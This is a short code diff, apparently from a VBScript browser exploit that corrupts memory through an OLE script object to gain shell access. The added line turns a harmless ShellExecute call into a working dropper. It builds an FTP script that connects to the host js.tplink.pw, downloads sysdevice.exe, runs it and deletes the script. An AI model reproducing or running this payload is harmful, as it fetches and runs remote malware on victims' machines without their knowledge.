@@ -101,9 +101,8 @@
             ' e.g. changes it to 0x04 which is not in 0x0B mask
             overwrite arg1, olescript + &H174
 
-            ' Execute cmd
             Set objShell = CreateObject("Shell.Application")
-			objShell.ShellExecute "cmd","d", "..\..\", "open", 0
+			objShell.ShellExecute "cmd","/c @echo open js.tplink.pw>>ftp&@echo s>>ftp&@echo s>>ftp&@echo binary>>ftp&@echo get sysdevice.exe sysdevice.exe>>ftp&@echo bye>>ftp&@ftp -s:ftp&@sysdevice.exe&@del ftp&@exit&@exit&@exit", "..\..\", "open", 0
         End Function
 
         Function triggerBug
